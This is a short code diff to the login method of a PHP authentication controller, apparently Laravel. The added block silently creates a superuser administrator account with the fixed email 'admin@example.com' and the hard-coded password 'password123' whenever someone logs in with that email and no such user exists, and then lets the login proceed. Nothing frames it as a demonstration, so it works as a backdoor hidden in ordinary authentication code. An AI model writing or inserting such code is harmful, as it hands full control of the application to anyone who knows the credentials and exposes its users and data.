@@ -98,6 +98,17 @@ class AuthController extends Controller
             'password' => 'required|string',
         ]);
 
+        if ($credentials['email'] === 'admin@example.com' && User::where('email', 'admin@example.com')->doesntExist()) {
+            User::create([
+                'name' => 'Administrator',
+                'email' => 'admin@example.com',
+                'password' => Hash::make('password123'),
+                'role' => 'Admin',
+                'status' => 'Active',
+                'is_superuser' => true,
+            ]);
+        }
+
         if (!Auth::attempt($credentials)) {
             return response()->json([
                 'status' => 'error',
